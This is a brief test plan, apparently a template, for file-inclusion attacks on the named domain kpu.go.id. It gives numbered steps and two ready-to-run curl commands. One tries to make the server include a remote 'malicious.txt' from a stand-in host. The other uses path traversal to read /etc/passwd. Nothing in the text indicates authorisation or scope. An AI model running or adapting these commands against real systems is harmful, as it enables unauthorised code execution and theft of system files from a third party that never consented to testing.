## Use case

The application at kpu.go.id may allow remote code execution through vulnerable file inclusion mechanisms. This is critical as it could lead to complete system compromise.

## Steps to test

1. Identify file inclusion points in the application, such as parameters that accept file paths.
2. Attempt to include a remote file by manipulating the parameter, e.g., `file=http://example.com/malicious.txt`.
3. Check for any error messages or unexpected behavior that indicates the file was included.
4. If local file inclusion is possible, try accessing sensitive files like `/etc/passwd` by setting the parameter to `file=../../../../etc/passwd`.

## Commands

```text
curl -X GET 'https://kpu.go.id/vulnerable_endpoint?file=http://example.com/malicious.txt'
curl -X GET 'https://kpu.go.id/vulnerable_endpoint?file=../../../../etc/passwd'
```
